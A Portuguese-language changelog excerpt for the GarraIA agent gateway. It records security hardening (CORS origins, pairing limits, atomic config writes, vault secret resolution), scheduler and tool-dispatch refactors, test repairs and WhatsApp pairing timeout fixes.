+- **Decisoes de produto do threat model fechadas pelo dono (#1182, #1191).** O
+  pareamento continua global por instalacao (um codigo do `/pair` vale em qualquer
+  canal habilitado; o `channel_id` do `PairingManager` e informativo), o codigo fica
+  em 6 digitos (com 20 palpites por ciclo a chance de acerto e 2e-5, e o codigo e
+  ditado por voz), os limites de tentativa ficam fixos (5 por usuario / 15 min / 20
+  globais) e alcancar o console por nome DNS segue exigindo `gateway.allowed_origins`.
+  Tudo registrado nas secoes 5.10 e 5.11 de `docs/security/threat-model.md`.
+- **`gateway.allowed_origins` vazio passa a significar "nenhuma origem cross-origin" (#1182).**
+  Antes significava allow-all. Quebra conhecida e deliberada de um perfil: alcancar o
+  Web Console por **nome DNS** — reverse proxy com dominio proprio, mDNS (`nas.local`),
+  Tailscale MagicDNS, nome de servico Docker/Compose, ingress — **sem** listar esse nome
+  em `allowed_origins` passa a receber `403` nos `POST`/`PATCH`/`DELETE` vindos do
+  navegador e no handshake do chat (`/ws`), porque o nome nao atravessa a ancora
+  anti-DNS-rebinding (no reverse proxy, alem disso, o proxy termina TLS e o gateway por
+  baixo fala `http`, entao o esquema da origem nao bate). A correcao e de uma linha de
+  config: liste a origem em `gateway.allowed_origins` (`https://garraia.seudominio.com`,
+  `http://nas.local:3888`) — uma origem declarada ali e aceita como tal, incluindo o
+  esquema, e destrava CORS, guarda e WebSocket de uma vez. Acesso por IP ou `localhost`
+  nao precisa de nada. Ver `docs/hardening-gateway.md`. O perfil default (loopback, sem
+  chave), que e a esmagadora maioria das instalacoes, nao muda.
+- **O auto-router de modo passa a valer em todos os pontos de entrada
+  (#1223).** O roteador do GAR-227 — heuristica primeiro, LLM curto depois —
+  ja existia e funcionava, mas estava ligado em um lugar so: o shim OpenAI do
+  gateway. `garra chat`, `POST /api/chat`, o WebSocket do webchat, o app mobile
+  e os treze canais (Telegram, Discord, Slack, WhatsApp, Signal, Matrix,
+  iMessage, IRC, Line, Google Chat, Teams, OpenClaw) nunca classificavam nada:
+  a sessao sem modo escolhido seguia sem modo, e o trabalho do roteador so
+  aparecia para quem entrava pela porta que quase ninguem usa.
+  A classificacao passou para um unico ponto de estrangulamento,
+  `AppState::exec_context_for_msg`, que so age quando as tres condicoes valem
+  ao mesmo tempo: a sessao nao tem modo escolhido, a flag
+  `agent.auto_router_llm_enabled` esta ligada, e ha texto de mensagem. O
+  `exec_context_for` antigo continua existindo e delega com `text: None`, entao
+  os caminhos sem mensagem disponivel (a2a, entre outros) nao mudam.
+  O contrato do GAR-227 fica intacto no ponto que mais importa: o modo deduzido
+  e persistido com `set_agent_mode_auto`, aparece no `/mode` e **nao** liga a
+  ToolPolicy do #988. Deduzir nao e consentir — um modo que o sistema adivinhou
+  nao concede tool nenhuma que o usuario nao tenha concedido.
+  Com a flag desligada, que segue sendo o default, o comportamento e byte a
+  byte o de antes; ha teste de regressao afirmando exatamente isso.
+- As quatro copias do loop de turno do `AgentRuntime` agora despacham tools
+  por uma unica funcao (`dispatch_tool_call`): orcamento, deteccao de loop,
+  gate do modo (#988), eventos de ciclo de vida, timeout e pausa de
+  confirmacao vivem num lugar so (#1226, slice S-A).
+- **`DbRunLedger` passa a aceitar o `Arc<tokio::sync::Mutex<SessionStore>>` que o
+  gateway ja guarda (#1227).** O adapter do ledger de runs exigia
+  `std::sync::Mutex`, enquanto o `AppState` do gateway guarda o `SessionStore`
+  atras do mutex do tokio - tipos incompativeis, entao o wiring era impossivel
+  sem um segundo store so para o ledger. O trait `RunLedger` vira `async` (via
+  `async_trait`, a mesma excecao documentada de `garraia_storage::ObjectStore`:
+  e consumido como `dyn`), `NoopLedger` e `DbRunLedger` acompanham, e
+  `SubAgentConfig` ganha `session_id` (builder `with_session_id`), que o
+  `spawn_agent` repassa ao `on_start` - antes o run nascia sempre com
+  `session_id = NULL`. Continua sem chamador de producao: o adapter agora e
+  utilizavel, mas nenhum caminho do gateway/CLI constroi um `AgentCoordinator`,
+  e o wiring na subida segue sendo a #1227.
+- A rustdoc do `RunLedger`/`DbRunLedger` nao afirma mais que o gateway/CLI
+  injetam o adapter: o wiring de producao (subida chamando
+  `mark_interrupted_runs`, scheduler gravando run) e a #1227 e ainda nao
+  existe. O fragmento da #1224 ja dizia a verdade; os doc comments agora
+  dizem a mesma coisa.
+- **Scheduler reivindica tarefas sob lease; re-poll apos queda e explicito e
+  logado (#1227 slice 2).** O `run_scheduler` lia as tarefas vencidas com um
+  `SELECT` puro e so mudava o status ao terminar — uma queda no meio do turno
+  deixava a linha `pending`, e o tick seguinte (60 s) reexecutava a mesma
+  tarefa EM SILENCIO, com mensagem de sistema duplicada no canal. Agora o
+  tick passa por `claim_due_tasks`: numa transacao `BEGIN IMMEDIATE`, cada
+  tarefa vencida vira `status = 'running'` com `lease_until = now + 600 s` e
+  `leased_by = <uuid do processo>`, e so as linhas que ESTE chamador de fato
+  virou (`UPDATE ... WHERE status = 'pending'`, contando `changes()`) sao
+  devolvidas — dois schedulers sobre o mesmo arquivo nunca levam a mesma
+  tarefa. `recover_expired_leases` devolve a `pending` toda tarefa `running`
+  cuja lease passou (ou que ficou `running` sem lease) e a DEVOLVE ao
+  chamador; `log_recovered_leases` grava `warn!` com id, `attempts` e
+  `execute_at` — nunca `payload` (PII) — e roda na subida do gateway, ao lado
+  de `log_interrupted_runs`, e no inicio de cada tick. Os terminais
+  (`complete_task`, `fail_task`, `retry_or_fail_task`, `complete_recurring_run`)
+  limpam a lease; o retry e o pulo de ocorrencia recorrente tambem devolvem o
+  status a `pending`, o que antes nao precisavam fazer. Migration forward-only
+  no `run_migrations` do `SessionStore`: colunas `lease_until TEXT` e
+  `leased_by TEXT` em `scheduled_tasks`, com `ALTER TABLE` guardado por
+  `pragma_table_info` (falha real sobe como erro em vez de virar coluna
+  ausente), mais indice parcial `idx_tasks_lease`. `poll_due_tasks` continua
+  existindo como leitura pura, documentado como tal. Teste de varredura fixa
+  que `run_scheduler` usa `claim_due_tasks` e nao `poll_due_tasks`, e que a
+  recuperacao roda nos dois lugares.
+- **Todas as crates do workspace passam a declarar a MSRV (#1228).** Apenas 3
+  das 23 crates herdavam `rust-version` do `[workspace.package]`; nas outras 20
+  o cargo nao tinha como recusar um toolchain velho, e o erro so aparecia no
+  meio da compilacao, atribuido a uma crate qualquer. Agora `garraia-glob`,
+  `garraia-runtime` e `garraia-tools` trazem `rust-version = "1.95"` literal
+  (elas ainda nao herdam nada do workspace: tem `version` e `edition`
+  proprios, e migrar a heranca inteira mudaria os dois junto) e as demais usam
+  `rust-version.workspace = true`. Nao ha `rust-toolchain.toml` de proposito:
+  o CI roda lint e teste em `stable` e so o job de MSRV roda `cargo check` no
+  piso, entao pinar 1.95 na arvore deixaria o `cargo clippy` local vermelho
+  numa `main` verde.
+- **O formato dos fragmentos de `changelog.d/` virou gate de CI (#1228).** O
+  `assemble.py --check` existia desde sempre e so rodava se alguem lembrasse;
+  uma auditoria achou 4 de 6 PRs abertas sem fragmento nenhum. Como as notas
+  de release saem do `CHANGELOG.md` e nao da lista de commits, o silencio so
+  aparecia no dia da release. O job novo tambem roda os testes do proprio
+  `assemble.py` e dos parsers do quality ratchet — em invocacoes separadas,
+  porque as duas suites trazem um pacote `tests` homonimo e uma chamada unica
+  quebra na coleta. A checagem de *presenca* de fragmento fica para uma fatia
+  propria, que precisa de label de escape e de periodo em observacao.
+- **O roster no `.claude/agents/team-coordinator.md` estava defasado (#1228).**
+  A tabela listava deepseek, glm e gpt e afirmava que a independencia de
+  julgamento vinha de o Reviewer usar um modelo diferente do Implementer. O
+  roster e Claude desde 2026-09-14 e a independencia vem do contexto separado
+  (agente, prompt e worktree distintos, com o Reviewer lendo o diff e nunca o
+  relatorio do Implementer) — como `skills/assemble-team.md` e o `CLAUDE.md` ja
+  diziam. As duas skills de orquestracao ganharam uma secao de pre-requisitos
+  dizendo que sem ferramenta de spawn de subagente o R4 nao e mergeavel por
+  construcao, e o que fazer nesse caso.
+- **Quem muta a arvore trabalha em worktree propria (#1228).** `code-reviewer` e
+  `test-engineer` passam a dizer isso explicitamente. Uma mutacao aplicada e
+  restaurada numa worktree compartilhada apareceu, para o Implementer que
+  trabalhava nela, como edicao nao-commitada desativando a maquina de estados:
+  ele parou, reverteu para a versao auditada e reportou — comportamento certo,
+  arranjo errado. Junto, `assemble-team.md` ganha o gate que faltava em R4: o
+  `security-auditor` pede o controle e o `code-reviewer` **muta o controle**,
+  provando que sua remocao fica vermelha. O caso que motivou: uma auditoria R4
+  exigiu `env_clear()` no spawn do filho e a allowlist de ambiente, os dois
+  foram aplicados, e apagar o `env_clear()` depois deixava 93 de 93 testes
+  verdes — o teste afirmava o conteudo de duas constantes, nunca que o
+  ambiente era limpo.
+- **O comentario do Quality Ratchet passa a dizer o que mudou NESTA PR, nao so
+  vs baseline (#1254).** Como o comparador so olhava `.quality/baseline.json`
+  (congelado em 2026-05-05), toda PR recebia o mesmo texto — a #1235 foi
+  acusada de `files_over_700` 34 → 36 sem ter tocado em nada. `compare.py`
+  ganha `--base <merge-base-metrics.json>`: com ele cada linha da tabela traz a
+  coluna `Δ nesta PR` (current menos merge-base) e o relatorio abre com o
+  veredito `Sem regressao nova nesta PR` ou `REGRESSAO NOVA nesta PR: <metrica>
+  <delta>`, listando so o que piorou dentro da propria PR; a comparacao contra
+  o baseline continua, rotulada `vs baseline (<data>) — ver #1254`, e cada
+  regressao dela diz se e nova, pre-existente no merge-base ou nao mensuravel
+  la (metrica nao coletada no base — a cobertura no CI, cujo `lcov.info` so
+  existe no checkout da PR); nesse terceiro caso o veredito e ⚠️, nao ✅,
+  porque o relatorio nao afirma pre-existencia do que nunca mediu. O
+  `quality-ratchet.yml` coleta as metricas do `pull_request.base.sha` num
+  worktree separado (`GARRAIA_REPO_ROOT=/tmp/base`, com os parsers da propria
+  PR) e passa `--base` so em `pull_request`; em `push` para `main` o relatorio
+  e byte-identico ao de antes. Exit code nao muda: `report-only` segue sempre 0
+  e `enforce` segue decidido so pelo baseline. Quando `frozenAt` do baseline
+  esta a mais de 90 dias de `collected_at` do current — calculo sobre os dois
+  campos, sem relogio, deterministico — entra a linha WARN `baseline_age_days`
+  apontando a #1254. O `baseline.json` nao foi tocado: re-baseline continua
+  sendo decisao do dono.
+- A documentacao descreve a precedencia real do bind do gateway: `--host`/
+  `--port` explicitos > `HOST`/`PORT` de ambiente > defaults `127.0.0.1:3888`,
+  e as chaves `gateway.host`/`gateway.port` do arquivo de config NAO alimentam
+  o `garra start` (medido na v0.4.2). `docs/auth-config.md` ganhou a secao 5.1
+  com a cadeia e as consequencias para `config check`; os trechos de
+  `docs/installation.md` e `docs/deployment-runpod.md` que tratavam o valor do
+  arquivo como governante do bind foram corrigidos (#1261).
+
+### Deprecated
+- **`ToolRegistry::execute_program` (`garraia-tools`) marcada `#[deprecated]`
+  (#1226).** A funcao entrou pela #1224 como primeiro passo do Code Mode, mas
+  ficou onde o runtime nao alcanca: `garraia-tools` nao e dependencia do
+  `AgentRuntime`, a funcao nao consulta o `ToolGate` dos modos e nao tem
+  nenhum chamador fora dos proprios testes da crate. Deixa-la publica sem
+  aviso convidava alguem a liga-la ao loop por fora do gate — exatamente o
+  caminho que a #1226 quer fechar. O atributo (`since = "0.4.3"`, a versao do
+  trem GarraIA, nao a da crate) aponta para a substituta: a `tool_program`
+  intrinseca do `AgentRuntime`, com gate por passo, que e a #1226 S-B. Nada
+  foi removido nesta fatia; os testes seguem exercitando a funcao sob
+  `#[allow(deprecated)]`.
+
+### Fixed
+- **Stream que quebra no meio agora refaz o turno em vez de matar ele (#1176).**
+  `stream read error: error decoding response body` (upstream de provider free
+  cortando o corpo, rede movel) matava o turno de primeira: sem retry, sem
+  fallback, so a mensagem de erro no canal. Quando nada tinha ido ao sink
+  ainda, o turno agora refaz uma vez pelo caminho batch (mesmo redo do
+  #1048), que tem retry/fallback de verdade. Com texto ja entregue ao
+  usuario, o erro original continua chegando — reenviar duplicaria o que ja
+  apareceu no canal.
+- **Garra Mobile deixa o icone padrao do template Flutter e passa a usar a
+  marca do app, o lobo neon (#1177).** O APK era instalado com o logotipo do
+  Flutter porque os `mipmap-*/ic_launcher.png` nunca tinham sido trocados.
+  Agora o launcher mostra o mesmo WolfMark do header da home e da splash
+  (`lib/widgets/brand/wolf_mark.dart`) como icone adaptativo (API 26+, fundo
+  `garra_icon_bg` + frente dentro da zona segura de 66 dp), com camada
+  monochrome para os themed icons do Android 13+, `roundIcon` e PNGs legados
+  para API < 26 em todas as densidades. Os assets sao gerados por
+  `apps/garraia-mobile/tool/gen_launcher_icons.py`, que reproduz a geometria
+  do `_WolfPainter` de forma deterministica — rodar o script de novo nao
+  produz diff. O papagaio de `assets/logo.png` continua sendo a marca do CLI,
+  do desktop e do site.
+- **`/pair` volta a funcionar — em todos os 11 canais, nao so no Telegram
+  (#1189).** O comando gerava o codigo de 6 digitos em `state.pairing`, mas
+  cada bootstrap de canal montava um `PairingManager` proprio, e era nessa
+  instancia local que o handler de mensagens chamava `claim()`. A tabela
+  local estava sempre vazia: o `claim()` devolvia `None`, o usuario caia em
+  `telegram: unauthorized user ...` e a mensagem era descartada, mesmo com o
+  codigo enviado dentro da janela de 5 minutos. O mesmo copy-paste duplicava
+  a `Allowlist`: duas instancias liam o MESMO `allowlist.json` e ambas
+  gravavam nele em `add()`/`claim_owner()`, entao uma sobrescrevia o owner ou
+  o usuario recem-pareado da outra — perda de escrita silenciosa em disco.
+  Agora os dois gates saem de um unico lugar, `channel_gates(state)`, que
+  entrega as instancias do `AppState` compartilhadas por `/pair`, pelo
+  handler de mensagens e pelo handler de voz. Telegram, Slack, Discord,
+  WhatsApp, Signal, Matrix, IRC, LINE, Teams, Google Chat e iMessage estavam
+  afetados pela duplicacao da allowlist; o `/pair` sem efeito era o do
+  Telegram (o unico que passa pelo `commands.rs`) — no Discord, cujo `/pair`
+  local gerava e resgatava na mesma instancia, o pareamento ja funcionava, e
+  os outros nove canais nunca puderam emitir `/pair`. Mudanca de
+  comportamento a registrar: com um `PairingManager` so por processo, um
+  codigo gerado pelo `/pair` passa a ser resgatavel em **qualquer** canal
+  habilitado (coerente com a allowlist global, que sempre foi um
+  `allowlist.json` so); a protecao contra forca bruta no `claim()` e o aviso
+  de queima ao dono estao no #1191.
+- **Testes de PDF do `garraia-media` voltam a rodar (#1208).** Cinco testes
+  estavam `#[ignore]`d desde 2026-04-15, atribuidos a "lopdf version drift".
+  A causa era outra: a fixture `create_test_pdf` escrevia bytes de PDF na mao
+  com offsets de `xref` errados, e esses bytes nao carregam em nenhuma versao
+  do lopdf. Toda fixture passa a sair do writer do proprio lopdf, que ja era
+  usado pelo teste de smoke. `test_extract_page_range_invalid` passava **pelo
+  motivo errado** — como a fixture nao carregava, o erro vinha do
+  `Document::load` e a validacao de faixa nunca era alcancada — e agora
+  exercita a validacao de verdade. A assercao tautologica de
+  `test_extract_metadata` (`title.is_none() || title.is_some()`) deu lugar a
+  duas assercoes reais, incluindo a primeira cobertura de um PDF com `/Info`
+  preenchido. De 16 passed / 6 ignored para 22 passed / 1 ignored.
+- **Deteccao de formato de imagem por magic bytes volta a ser testada (#1209).**
+  `test_detect_format_from_bytes` estava `#[ignore]`d desde 2026-04-15,
+  atribuido a drift do crate `image`. A funcao nem usa esse crate: e comparacao
+  de magic bytes pura, com um piso de 12 bytes que existe porque o ramo do WEBP
+  le `data[8..12]`. As fixtures do teste tinham 8 e 4 bytes, caiam no piso e
+  voltavam "unknown". Com cabecalhos reais de 12 bytes o teste volta a rodar, e
+  os ramos GIF, WEBP e BMP — que nunca tiveram cobertura — passam a ser
+  exercitados, junto com o caso RIFF/WAVE, que e a unica condicao composta da
+  funcao. Um teste novo fixa o piso de 12 bytes como comportamento deliberado.
+  O codigo de producao nao muda.
+- **O contexto de projeto do `garra chat` para de gastar prompt com `target/` e
+  passa a dizer que projeto e em que ramo (#1219).** O `scan_directory_context`
+  listava qualquer entrada do topo do diretorio, entao `target/`,
+  `node_modules/` e `dist/` entravam no system prompt de todo turno — tokens
+  pagos para informar ao modelo que o projeto tem um diretorio de build. Pior
+  que o desperdicio era o que faltava: o resumo nao dizia **qual** projeto era
+  (so marcadores genericos tipo "Rust project") nem **em que ramo** o agente
+  estava, embora o painel `/contexto` ja mostrasse o ramo na tela ao lado.
+  Agora doze diretorios de build e dependencia sao filtrados da listagem, o
+  nome do projeto sai do primeiro heading do `README.md` e o ramo vem do mesmo
+  `ui::git_branch` que o painel `/contexto` usa — leitura direta de `HEAD`, sem
+  spawnar `git` e sem varrer a arvore, entao worktree e submodulo continuam
+  resolvendo certo. O filtro so descarta o que e **diretorio**: um arquivo
+  chamado `build` ou `coverage` segue aparecendo, que e o caso em que o nome
+  carrega informacao de verdade.
+  A composicao do resumo passou a ser por partes juntadas com `|`, porque com
+  quatro campos opcionais a concatenacao antiga deixava separador orfao toda
+  vez que um deles vinha vazio.
+- **Suite de integracao S3 volta a exercitar um MinIO de verdade (#1230).**
+  Os 8 testes de `crates/garraia-storage/tests/s3_integration.rs` fechavam
+  verdes em milissegundos sem asserir nada: `minio/minio`, a imagem que
+  `testcontainers-modules` 0.15 fixa, foi removida do Docker Hub por inteiro
+  (o registry responde "object not found" para o repositorio, nao so para a
+  tag), entao `start_minio()` sempre caia no branch de skip silencioso. O
+  teste agora aponta para `quay.io/minio/minio` na mesma tag
+  (`RELEASE.2025-02-28T09-55-16Z`) via `ImageExt::with_name`/`with_tag` —
+  mesma imagem, mesmo conteudo, so troca o registry. O step `storage-s3` do
+  CI liga `GARRAIA_REQUIRE_DOCKER=1`, que o teste ja honrava: dali em diante
+  um verde nesse step so acontece se o container realmente subir e o
+  round-trip rodar contra ele.
+- **MCP: referencias `vault:` no `env` de servidores do config.yml/mcp.json
+  nao eram resolvidas no boot** (#1237). A resolucao de `vault:` vivia so no
+  registry (`McpPersistenceService::load_registry`, GAR-291), e o caminho de
+  boot (`ConfigLoader::merged_mcp_config` -> `build_mcp_tools`) copiava o
+  mapa `env` como estava: o filho recebia a string literal como valor da
+  variavel — o operador acreditava que o segredo estava cifrado, e o
+  servidor falhava de forma enganosa. Agora o boot resolve com o MESMO
+  helper do registry (`resolver_env_com_vault`), e a politica e **fail-
+  closed**: referencia que nao resolve (cofre ausente, `GARRAIA_VAULT_`
+  `PASSPHRASE` sem set, chave inexistente) impede o servidor de subir, com
+  aviso nomeando servidor e chave, nunca o valor — sem pending de proposito,
+  porque o pending guardaria o env literal e um retry bem-sucedido entregaria
+  a string crua ao filho. O `garra config check` passa a avisar quando ha
+  `vault:` no `env` de um servidor MCP com o cofre indisponivel (config
+  mergeada: config.yml + mcp.json). Docs voltam a recomendar `vault:` no
+  `env` (`mcp-capacidades`, `config.basic.yml`, threat-model E). Teste de
+  integracao com o fixture `--expose-env` prova o valor resolvido chegando
+  ao filho e o servidor bloqueado sem valor no texto; a mutacao desligando
+  a resolucao derruba o teste.
+- **`ConfigLoader::save` passou a ser atomica, e um `config.yml` vazio deixou de
+  virar defaults (#1238).** A escrita era `std::fs::write` — truncate-then-write
+  — com o aperto de permissao (`0600`) rodando **depois**: havia uma janela em
+  que `llm.*.api_key` e `gateway.api_key` estavam no disco sob o modo do umask,
+  e uma queda no meio deixava o arquivo pela metade ou vazio. Agora e tmp no
+  mesmo diretorio, nascido `0600` via `OpenOptionsExt::mode`, `sync_all`,
+  `rename` e `fsync` do diretorio — o mesmo padrao que o store de sessao do
+  `whatsapp_linked` ja usava, ate no nome do temporario. Ele nao e mais
+  `.config.yml.tmp`: com dois escritores (ver abaixo) os dois calculavam o
+  MESMO caminho e o abriam com `O_TRUNC`, de modo que a construcao vendida
+  como conserto anti-corrida tinha uma corrida propria — tmp com fragmentos
+  dos dois, renomeado por cima da config. Agora o sufixo e aleatorio e a
+  abertura e `create_new`, que tambem recusa seguir symlink plantado no
+  caminho. E o temporario e apagado em qualquer falha a partir do
+  ponto em que ele e **nosso** — e so a partir dali: apagar um temporario que
+  o `create_new` acabou de recusar destruiria o arquivo do outro escritor,
+  que e exatamente o que o `create_new` existe para evitar.
+  O par disso: `ConfigLoader::load` **recusa** um `config.yml` sem conteudo —
+  em branco, ou so com comentarios — em vez de devolver `AppConfig::default()`
+  com sucesso. Era o pior dos tres estados —
+  o gate de credencial do gateway desaparecia em silencio e o `save()` seguinte
+  gravava os defaults por cima da config do usuario.
+  A janela deixou de ser teorica nesta fatia: alem da CLI (`garra whatsapp
+  link`/`logout`), o gateway passou a chamar `set_channel_enabled` sozinho
+  quando o servidor invalida a sessao — dois escritores, sem lock.
+- **`garra whatsapp link` e `garra whatsapp cloud` num pipe deixam de devolver
+  o comando que voce acabou de rodar (#1238).** Sem terminal, os tres comandos
+  imprimiam o MESMO texto, byte a byte — e esse texto termina mandando rodar
+  `garra whatsapp link`. Medido no binario: o `diff` entre as saidas de
+  `whatsapp`, `whatsapp link` e `whatsapp cloud` era vazio, e os tres saiam 0.
+  Quem conecta um GarraIA headless com `ssh servidor 'garra whatsapp link'`
+  caia num ciclo fechado: sem QR, sem erro, e com um exit code afirmando que
+  tinha dado certo. Agora quem JA escolheu o fluxo recebe o motivo (o QR se le
+  deste terminal e o consentimento se da nele), a saida (`ssh -t <usuario>@
+  <maquina> garra whatsapp link`) e exit 69 `EX_UNAVAILABLE` em vez de 0. O
+  `garra whatsapp` sem escolha continua saindo 0 com as duas opcoes: ali o
+  hint E a resposta, nao uma repeticao.
+- **`garra whatsapp link` deixa de exibir uma linha congelada enquanto a ponte
+  esta muda (#1238).** O `→ conectando ao WhatsApp…` era impresso uma vez, na
+  troca de fase, e o contador regressivo so roda nas fases que ja tem QR na
+  tela. Medido com o Baileys real (7.0.0-rc14) num container que nao alcanca
+  os servidores do WhatsApp: `status connecting` aos 2 s e **nada** por 85 s.
+  Ou seja, ate dois minutos de linha estatica antes de o teto de
+  `no_progress_after_secs` encerrar com a mensagem certa. Nao era infinito,
+  mas nao era feedback. Agora um pulso a cada 5 s diz ha quanto tempo esta
+  tentando e em quantos segundos desiste — e o prazo anunciado e o MESMO
+  relogio que de fato encerra, com teste afirmando a soma. O
+  `PairUi::connecting` entrou **sem implementacao default**: uma UI nova tem
+  de decidir o que mostrar, porque herdar silencio em silencio foi exatamente
+  o defeito.
+- **`garra whatsapp` nao fica mais em "conectando ao WhatsApp…" para sempre
+  quando a ponte fala e nunca progride (#1238).** O prazo de silencio da
+  revisao anterior conta desde o ULTIMO evento e zera a qualquer um deles,
+  inclusive os que significam "falhei de novo". A ponte reconecta sozinha, sem
+  teto, emitindo `disconnected` e `status` a cada rodada de backoff — no
+  maximo a cada 30 s, sempre abaixo dos 90 s do prazo. Resultado: o prazo
+  existia, funcionava, e nunca disparava, porque o proprio fracasso o
+  realimentava. Quem caia nisso era o usuario sem internet, atras de portal de
+  autenticacao de wi-fi, com a porta 443 bloqueada ou com o relogio do sistema
+  errado: a tela parava em duas linhas e so o Ctrl+C saia. Agora cada queda
+  aparece na tela com o motivo e o prazo da proxima tentativa, e existe um
+  segundo teto — 120 s de TEMPO SEM PROGRESSO, que **nao zera com evento** —
+  para o caso de o pareamento nao andar; ele diz o que verificar e manda rodar
+  o comando de novo. Quem renova esse teto e a FASE do pareamento: enquanto
+  houver QR na tela ele nao corre, e por isso o usuario lento para pegar o
+  celular nao e cortado (quem limita esse caso e o teto de 5 QRs). Um QR que
+  expira sem substituto volta a arma-lo.
+- **Um unico QR nao desarma mais os tetos do pareamento para sempre
+  (#1238).** Com a rede caindo logo DEPOIS de o QR aparecer, os tres relogios
+  do comando ficavam desligados ao mesmo tempo: o de silencio porque cada
+  tentativa fracassada o realimenta; o de QR porque, expirado aquele, a
+  maquina estaciona num estado onde nao ha mais nada a expirar; e o de
+  progresso porque ele era um booleano de "ja progrediu alguma vez" que o
+  primeiro QR ligava e nada desligava. Com os prazos de producao o comando nao
+  terminava nunca — so o Ctrl+C saia. O booleano virou um relogio de
+  progresso medido pela fase do pareamento.
+- **O pareamento que autentica e nunca conecta tambem tem teto agora
+  (#1238).** O relogio de progresso da revisao anterior era renovado enquanto
+  o pareamento PERMANECIA numa fase que anda — e permanecer e justamente o que
+  permite estacionar. Bastava a fase "autenticado", que nao expira sozinha e
+  nao sai com uma queda, para o comando rodar para sempre: e o caminho real do
+  WhatsApp, em que logo depois de o usuario escanear o servidor pede para
+  reiniciar a conexao e a reconexao nunca fecha (portal de autenticacao que
+  caiu depois do scan, porta 443 intermitente). Agora o relogio so e renovado
+  quando o pareamento chega MAIS LONGE do que ja esteve, e como esse avanco e
+  monotono o numero de renovacoes e finito: nenhuma fase, e nenhum ciclo de
+  fases, escapa. Isso fecha tambem o caso de uma ponte que conecta, cai e
+  conecta de novo sem parar, que renovava o relogio a cada volta. Um teste
+  enumera todas as fases e nao compila se alguem acrescentar uma sem dizer
+  qual e o teto dela.
+- **O modo `serve` desiste quando a ponte fala sem nunca conectar (#1238).**
+  E o mesmo problema do lado do daemon: o prazo do laco de eventos conta desde
+  o ultimo evento, e uma ponte que reconecta sozinha o realimenta a cada
+  tentativa fracassada. O canal ficava preso numa execucao que tentava para
+  sempre e o backoff de reconexao nunca chegava a rodar — sem ninguem olhando
+  um terminal. Agora ha um teto de tempo falando sem conectar, e estoura-lo
+  entrega o caso ao backoff que ja existia.
+- **O modo `serve` do gateway ganhou prazo onde o `pair` ja tinha (#1238).**
+  A espera pelo fim do processo filho, o envio de comando para ele e a espera
+  pelo PROXIMO EVENTO rodavam sem relogio: uma ponte que fecha a saida sem
+  terminar, que para de ler o proprio stdin, ou que sobe e emudece sem
+  conectar pendurava a task do canal em vez de cair no backoff de reconexao
+  que existe logo acima. O prazo do laco de eventos vale so antes de conectar:
+  depois disso o silencio e o estado normal de uma conta sem mensagens.
+- **O `shutdown` de cortesia deixou de poder pendurar a saida (#1238).** Ele e
+  o ultimo recurso de todo caminho de desistencia, o do Ctrl+C inclusive, e
+  rodava sem prazo — mas escrever no stdin do filho bloqueia assim que o
+  buffer do pipe enche e o filho para de ler. Agora ele tem 500 ms e desiste:
+  o que se espera ali e uma linha curta num pipe saudavel, e quem nao
+  respondeu nesse tempo nao vai responder.
+- **A linha de "nova tentativa em Ns" deixou de prometer prazo ja vencido
+  (#1238).** Ela truncava a divisao, entao um backoff de 1500 ms aparecia como
+  "1s" e a linha ficava vencida meio segundo depois. Junto disso a faixa de
+  500 a 999 ms mudou de aparencia: antes ela caia no generico "tentando de
+  novo", e agora arredonda para cima e anuncia "1s".
+- **`garra whatsapp restore` deixou de ligar o canal sem provar que a sessao
+  restaurada abre (#1238).** Restaurar move bytes; nao decifra nada. Com a
+  `session.key` perdida ou a passphrase do cofre trocada, o comando dizia
+  "Sessao restaurada", gravava `enabled = true` e saia 0 — e o gateway passava
+  a pagar timeout e retry a cada boot, que e exatamente o que a ordem
+  blob-antes-de-enabled existe para evitar. Agora ele abre o blob ANTES de
+  mover o arquivo e, se nao abrir, diz o que aconteceu e deixa o arquivado
+  exatamente onde estava. A ordem importa: provando depois do movimento, uma
+  passphrase do cofre apenas ausente do ambiente — quem a exporta e rodou num
+  shell sem ela — consumia o `.prev` e recebia o conselho de ler um QR novo,
+  que descartaria uma sessao intacta.
+- **`npm ci` estourando o prazo nao deixa mais um processo orfao (#1238).**
+  Depois dos 600 s o filho era largado rodando, mexendo no mesmo
+  `node_modules` que a tentativa seguinte ia recriar.
+- **`garra whatsapp` nao fica mais pendurado num bridge que sobe e nao fala
+  (#1238).** O prazo de silencio, o contador do QR e o braco de Ctrl+C so
+  comecavam DEPOIS do handshake com a ponte: `expect_started` e os dois
+  comandos de abertura rodavam sem relogio e sem cancelamento. Um `node` da
+  PATH que trava antes de rodar o bridge — shim de asdf, volta, nvm ou
+  corepack baixando versao, stub de snap esperando confirmacao, wrapper que le
+  stdin — deixava a tela parada nas instrucoes do QR para sempre, e nem o
+  primeiro nem o segundo Ctrl+C faziam nada, porque o comando ja havia trocado
+  o SIGINT default do sistema por um canal que ninguem estava lendo. A unica
+  saida era `kill -9`, e ai o `Drop` que devolve a sessao arquivada nao rodava:
+  num re-vinculo, a sessao boa ficava presa em `session.enc.prev`. Agora cada
+  etapa anterior ao laco tem prazo e tem o cancelamento em primeiro lugar, o
+  comando diz que o bridge nao respondeu e sugere conferir `node --version`, e
+  uma linha de status sai antes do handshake para a tela nunca ficar muda. O
+  mesmo tratamento vale para o modo `serve` do gateway, onde um handshake sem
+  resposta pendurava o boot em vez de cair no backoff que existe para isso.
+- **`docs/voice.md` documentava um provider de TTS e uma chave de config que nunca existiram.** A pagina
+  mostrava `tts_provider: openai` com `tts_voice: "alloy"`; o `server.rs` so casa `hibiki` e `lmstudio`,
+  e qualquer outro valor cai em silencio no Chatterbox — `VoiceConfig` nao tem campo `tts_voice`. A secao
+  passa a documentar o provider `lmstudio` (servidor compativel com `POST /v1/audio/speech`), traz a tabela
+  dos tres valores que fazem alguma coisa e diz que o resto vira Chatterbox sem aviso. `CLAUDE.md` e
+  `ROADMAP.md` atribuiam ElevenLabs e Kokoro a crate `garraia-voice`: os adaptadores vivem em
+  `garraia-channels::voice_channel`, atras da feature `voice` que nenhuma crate do workspace liga, e nao
+  chegam ao gateway.
+- **Prosas do repo deixam de afirmar um gate de boot que nao existe.** O
+  `garra config check` so e invocado por dois comandos opt-in
+  (`garra config check` e `garra doctor`) — nada no caminho de boot do
+  gateway roda o `run_check`, entao um `Severity::Error` na config nao
+  impede o gateway de subir. Duas prosas afirmavam o contrario: o
+  doc-comment do `spawn_hardware_adapters` ("mostra os mesmos erros de
+  config antes do boot") e o comentario do teto de risco das automacoes
+  ("o `garra config check` ja recusa R3+ antes do boot") foram reescritos
+  para descrever o comando pelo que ele e (report opt-in) e a camada viva
